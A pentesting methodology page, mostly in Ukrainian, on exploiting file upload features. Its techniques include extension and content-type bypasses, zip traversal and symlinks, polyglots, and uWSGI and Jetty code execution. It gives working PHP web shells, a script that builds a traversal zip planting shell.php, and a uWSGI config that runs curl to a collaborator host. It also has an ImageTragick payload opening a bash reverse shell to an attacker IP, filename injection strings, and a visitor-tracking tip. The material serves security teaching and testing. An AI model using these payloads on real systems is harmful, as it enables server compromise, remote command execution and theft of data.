# File Upload

{{#include ../../banners/hacktricks-training.md}}

## File Upload General Methodology

Інші корисні розширення:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass file extensions checks

1. Якщо це застосовно, **перевірте** **попередні розширення.** Також протестуйте їх, використовуючи деякі **великі літери**: _pHp, .pHP5, .PhAr ..._
2. _Перевірте **додавання дійсного розширення перед** виконуваним розширенням (використовуйте також попередні розширення):_
- _file.png.php_
- _file.png.Php5_
3. Спробуйте додати **спеціальні символи в кінці.** Ви можете використовувати Burp для **брутфорсу** всіх **ascii** та **Unicode** символів. (_Зверніть увагу, що ви також можете спробувати використовувати **раніше** згадані **розширення**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Спробуйте обійти захист, **обманюючи парсер розширень** на стороні сервера за допомогою технік, таких як **подвоєння** **розширення** або **додавання сміттєвих** даних (**нульових** байтів) між розширеннями. _Ви також можете використовувати **попередні розширення** для підготовки кращого payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Додайте **ще один рівень розширень** до попередньої перевірки:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Спробуйте поставити **exec розширення перед дійсним розширенням** і сподівайтеся, що сервер неправильно налаштований. (корисно для експлуатації неправильних налаштувань Apache, де все з розширенням **_**.php**_**, але** не обов'язково закінчується на .php** виконає код):
- _ex: file.php.png_
7. Використання **NTFS альтернативного потоку даних (ADS)** у **Windows**. У цьому випадку символ двокрапки “:” буде вставлений після забороненого розширення і перед дозволеним. В результаті на сервері буде створено **порожній файл з забороненим розширенням** (наприклад, “file.asax:.jpg”). Цей файл може бути відредагований пізніше за допомогою інших технік, таких як використання його короткого імені. Шаблон “**::$data**” також може бути використаний для створення непорожніх файлів. Тому додавання символу крапки після цього шаблону також може бути корисним для обходу подальших обмежень (.e.g. “file.asp::$data.”)
8. Спробуйте порушити обмеження імені файлу. Дійсне розширення обрізається. А шкідливий PHP залишається. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Bypass Content-Type, Magic Number, Compression & Resizing

- Обійти **Content-Type** перевірки, встановивши **значення** заголовка **Content-Type** на: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Обійти **magic number** перевірку, додавши на початку файлу **байти реального зображення** (заплутати команду _file_). Або введіть оболонку всередину **метаданих**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` або ви також можете **ввести payload безпосередньо** в зображення:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Якщо **сжаття додається до вашого зображення**, наприклад, використовуючи деякі стандартні PHP бібліотеки, такі як [PHP-GD](https://www.php.net/manual/fr/book.image.php), попередні техніки не будуть корисні. Однак ви можете використовувати **PLTE chunk** [**техніку, визначену тут**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) для вставки деякого тексту, який **переживе стиснення**.
- [**Github з кодом**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Веб-сторінка також може **змінювати розмір** **зображення**, використовуючи, наприклад, функції PHP-GD `imagecopyresized` або `imagecopyresampled`. Однак ви можете використовувати **IDAT chunk** [**техніку, визначену тут**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) для вставки деякого тексту, який **переживе стиснення**.
- [**Github з кодом**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Ще одна техніка для створення payload, який **переживе зміну розміру зображення**, використовуючи функцію PHP-GD `thumbnailImage`. Однак ви можете використовувати **tEXt chunk** [**техніку, визначену тут**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) для вставки деякого тексту, який **переживе стиснення**.
- [**Github з кодом**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Знайдіть вразливість для **перейменування** вже завантаженого файлу (щоб змінити розширення).
- Знайдіть вразливість **Local File Inclusion** для виконання бекдору.
- **Можливе розкриття інформації**:
1. Завантажте **кілька разів** (і одночасно) **той самий файл** з **тим самим ім'ям**
2. Завантажте файл з **ім'ям** файлу або **папки**, яка **вже існує**
3. Завантаження файлу з **“.”, “..”, або “…” як його ім'я**. Наприклад, в Apache у **Windows**, якщо програма зберігає завантажені файли в каталозі “/www/uploads/”, ім'я “.” створить файл під назвою “uploads” у каталозі “/www/”.
4. Завантажте файл, який може бути не легко видалити, наприклад, **“…:.jpg”** у **NTFS**. (Windows)
5. Завантажте файл у **Windows** з **недійсними символами**, такими як `|<>*?”` в його імені. (Windows)
6. Завантажте файл у **Windows**, використовуючи **зарезервовані** (**заборонені**) **імена**, такі як CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, і LPT9.
- Спробуйте також **завантажити виконуваний** (.exe) або **.html** (менш підозрілий), який **виконає код**, коли випадково відкриється жертвою.

### Special extension tricks

Якщо ви намагаєтеся завантажити файли на **PHP сервер**, [ознайомтеся з трюком **.htaccess** для виконання коду](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Якщо ви намагаєтеся завантажити файли на **ASP сервер**, [ознайомтеся з трюком **.config** для виконання коду](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Файли `.phar` схожі на `.jar` для java, але для php, і можуть бути **використані як php файл** (виконуючи його з php або включаючи його в скрипт...)

Розширення `.inc` іноді використовується для php файлів, які використовуються лише для **імпорту файлів**, тому в якийсь момент хтось міг дозволити **виконання цього розширення**.

## **Jetty RCE**

Якщо ви можете завантажити XML файл на сервер Jetty, ви можете отримати [RCE, оскільки **нові \*.xml і \*.war автоматично обробляються**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Отже, як зазначено на наступному зображенні, завантажте XML файл до `$JETTY_BASE/webapps/` і чекайте оболонку!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Для детального вивчення цієї вразливості ознайомтеся з оригінальним дослідженням: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Вразливості віддаленого виконання команд (RCE) можуть бути експлуатовані на серверах uWSGI, якщо є можливість змінити файл конфігурації `.ini`. Файли конфігурації uWSGI використовують специфічний синтаксис для включення "магічних" змінних, заповнювачів і операторів. Зокрема, оператор '@', який використовується як `@(filename)`, призначений для включення вмісту файлу. Серед різних підтримуваних схем в uWSGI, схема "exec" є особливо потужною, дозволяючи читати дані з стандартного виходу процесу. Цю функцію можна маніпулювати для злочинних цілей, таких як віддалене виконання команд або довільне записування/читання файлів, коли обробляється файл конфігурації `.ini`.

Розгляньте наступний приклад шкідливого файлу `uwsgi.ini`, що демонструє різні схеми:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Виконання payload відбувається під час парсингу конфігураційного файлу. Щоб конфігурація була активована та проаналізована, процес uWSGI повинен бути перезапущений (можливо, після збою або через атаку відмови в обслуговуванні) або файл повинен бути налаштований на автоматичне перезавантаження. Функція автоматичного перезавантаження, якщо вона увімкнена, перезавантажує файл через певні інтервали при виявленні змін.

Важливо зрозуміти м'яку природу парсингу конфігураційного файлу uWSGI. Зокрема, обговорюваний payload може бути вставлений у бінарний файл (такий як зображення або PDF), що ще більше розширює можливості потенційної експлуатації.

## **wget File Upload/SSRF Trick**

В деяких випадках ви можете виявити, що сервер використовує **`wget`** для **завантаження файлів**, і ви можете **вказати** **URL**. У цих випадках код може перевіряти, що розширення завантажених файлів знаходиться в білому списку, щоб забезпечити завантаження лише дозволених файлів. Однак, **цю перевірку можна обійти.**\
**Максимальна** довжина **імені файлу** в **linux** становить **255**, однак **wget** обрізає імена файлів до **236** символів. Ви можете **завантажити файл під назвою "A"\*232+".php"+".gif"**, це ім'я файлу **обійде** **перевірку** (оскільки в цьому прикладі **".gif"** є **допустимим** розширенням), але `wget` **перейменує** файл на **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Зверніть увагу, що **інший варіант**, про який ви можете думати, щоб обійти цю перевірку, - це зробити так, щоб **HTTP сервер перенаправляв на інший файл**, тому початкова URL-адреса обійде перевірку, а потім wget завантажить перенаправлений файл з новою назвою. Це **не спрацює** **якщо** wget не використовується з **параметром** `--trust-server-names`, оскільки **wget завантажить перенаправлену сторінку з назвою файлу, вказаною в оригінальній URL-адресі**.

## Інструменти

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) - це потужний інструмент, розроблений для допомоги пентестерам та шукачам вразливостей у тестуванні механізмів завантаження файлів. Він використовує різні техніки баг-баунті, щоб спростити процес виявлення та експлуатації вразливостей, забезпечуючи всебічну оцінку веб-додатків.

## Від завантаження файлів до інших вразливостей

- Встановіть **filename** на `../../../tmp/lol.png` і спробуйте досягти **перетворення шляху**
- Встановіть **filename** на `sleep(10)-- -.jpg` і ви можете досягти **SQL-ін'єкції**
- Встановіть **filename** на `<svg onload=alert(document.domain)>`, щоб досягти XSS
- Встановіть **filename** на `; sleep 10;`, щоб протестувати деякі ін'єкції команд (більше [триків ін'єкцій команд тут](../command-injection.md))
- [**XSS** в завантаженні файлів зображень (svg)](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** файл **завантаження** + **XSS** = [експлуатація **Service Workers**](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE в завантаженні svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Відкрите перенаправлення** через завантаження svg файлу](../open-redirect.md#open-redirect-uploading-svg-files)
- Спробуйте **різні svg payloads** з [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Відома вразливість **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Якщо ви можете **вказати веб-серверу, щоб отримати зображення з URL**, ви можете спробувати зловживати [SSRF](../ssrf-server-side-request-forgery/index.html). Якщо це **зображення** буде **збережено** на якомусь **публічному** сайті, ви також можете вказати URL з [https://iplogger.org/invisible/](https://iplogger.org/invisible/) і **вкрасти інформацію про кожного відвідувача**.
- [**XXE та CORS** обхід з завантаженням PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
- Спеціально підготовлені PDF для XSS: [наступна сторінка показує, як **впровадити PDF дані для виконання JS**](../xss-cross-site-scripting/pdf-injection.md). Якщо ви можете завантажувати PDF, ви можете підготувати деякі PDF, які виконуватимуть довільний JS відповідно до наданих вказівок.
- Завантажте \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) вміст, щоб перевірити, чи є на сервері якийсь **антивірус**
- Перевірте, чи є якийсь **обмеження за розміром** при завантаженні файлів

Ось топ-10 речей, які ви можете досягти, завантажуючи (з [тут](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Збережений XSS / SSRF / XXE
3. **GIF**: Збережений XSS / SSRF
4. **CSV**: Ін'єкція CSV
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : Ін'єкція HTML / XSS / Відкрите перенаправлення
8. **PNG / JPEG**: Атака піксельного затоплення (DoS)
9. **ZIP**: RCE через LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Розширення Burp

{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Магічні заголовки байтів

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Дивіться [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) для інших типів файлів.

## ZIP/TAR файл автоматично розпаковується при завантаженні

Якщо ви можете завантажити ZIP, який буде розпакований на сервері, ви можете зробити 2 речі:

### Символьне посилання

Завантажте посилання, що містить м'які посилання на інші файли, а потім, отримуючи доступ до розпакованих файлів, ви отримаєте доступ до пов'язаних файлів:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Розпакування в різних папках

Несподіване створення файлів у каталогах під час розпакування є значною проблемою. Незважаючи на початкові припущення, що ця конфігурація може захистити від виконання команд на рівні ОС через шкідливі завантаження файлів, ієрархічна підтримка стиснення та можливості обходу каталогів формату ZIP-архіву можуть бути використані. Це дозволяє зловмисникам обходити обмеження та виходити за межі безпечних каталогів завантаження, маніпулюючи функціональністю розпакування цільового застосунку.

Автоматизований експлойт для створення таких файлів доступний на [**evilarc на GitHub**](https://github.com/ptoomey3/evilarc). Утиліту можна використовувати, як показано:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Додатково, **трик з symlink з evilarc** є варіантом. Якщо мета полягає в тому, щоб націлитися на файл, наприклад, `/flag.txt`, слід створити symlink на цей файл у вашій системі. Це забезпечує, що evilarc не зіткнеться з помилками під час своєї роботи.

Нижче наведено приклад коду Python, який використовується для створення шкідливого zip-файлу:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Зловживання стисненням для спрейінгу файлів**

Для отримання додаткової інформації **перегляньте оригінальний пост у**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Створення PHP Shell**: PHP код написаний для виконання команд, переданих через змінну `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **Спрайінг файлів та створення стиснутого файлу**: Створюється кілька файлів, і збирається zip-архів, що містить ці файли.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Модифікація за допомогою Hex Editor або vi**: Імена файлів всередині zip змінюються за допомогою vi або hex editor, змінюючи "xxA" на "../" для переходу між каталогами.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Завантажте цей вміст з розширенням зображення, щоб експлуатувати вразливість **(ImageMagick , 7.0.1-1)** (з [експлойту](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Вбудовування PHP Shell у PNG

Вбудовування PHP shell у частину IDAT файлу PNG може ефективно обійти певні операції обробки зображень. Функції `imagecopyresized` та `imagecopyresampled` з PHP-GD є особливо актуальними в цьому контексті, оскільки вони зазвичай використовуються для зміни розміру та ресемплінгу зображень відповідно. Здатність вбудованого PHP shell залишатися незмінним під час цих операцій є значною перевагою для певних випадків використання.

Детальне дослідження цієї техніки, включаючи її методологію та потенційні застосування, надано в наступній статті: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Цей ресурс пропонує всебічне розуміння процесу та його наслідків.

Більше інформації в: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Поліглотні файли

Поліглотні файли слугують унікальним інструментом у кібербезпеці, діючи як хамелеони, які можуть дійсно існувати в кількох форматах файлів одночасно. Цікавим прикладом є [GIFAR](https://en.wikipedia.org/wiki/Gifar), гібрид, який функціонує як GIF та RAR-архів. Такі файли не обмежуються лише цим поєднанням; комбінації, такі як GIF і JS або PPT і JS, також можливі.

Основна корисність поліглотних файлів полягає в їх здатності обходити заходи безпеки, які перевіряють файли за типом. Загальноприйнята практика в різних додатках передбачає дозволення лише певних типів файлів для завантаження — таких як JPEG, GIF або DOC — щоб зменшити ризик, пов'язаний з потенційно шкідливими форматами (наприклад, JS, PHP або Phar файли). Однак поліглот, відповідно до структурних критеріїв кількох типів файлів, може непомітно обійти ці обмеження.

Незважаючи на свою адаптивність, поліглоти стикаються з обмеженнями. Наприклад, хоча поліглот може одночасно втілювати файл PHAR (PHp ARchive) та JPEG, успіх його завантаження може залежати від політики системи щодо розширень файлів. Якщо система сувора щодо дозволених розширень, то лише структурна двоїстість поліглота може не бути достатньою для гарантії його завантаження.

Більше інформації в: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Завантаження дійсних JSON, як якщо б це був PDF

Як уникнути виявлення типу файлу, завантажуючи дійсний JSON-файл, навіть якщо це не дозволено, підробляючи PDF-файл (техніки з **[цього блогу](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` бібліотека**: Якщо байти магії `%PDF` знаходяться в перших 1024 байтах, це дійсно (отримати приклад з посту)
- **`pdflib` бібліотека**: Додати підроблений PDF-формат всередині поля JSON, щоб бібліотека вважала, що це PDF (отримати приклад з посту)
- **`file` бінарний**: Він може прочитати до 1048576 байтів з файлу. Просто створіть JSON, більший за це, щоб він не міг розпарсити вміст як JSON, а потім всередині JSON вставте початкову частину справжнього PDF, і він подумає, що це PDF

## Посилання

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)

{{#include ../../banners/hacktricks-training.md}}
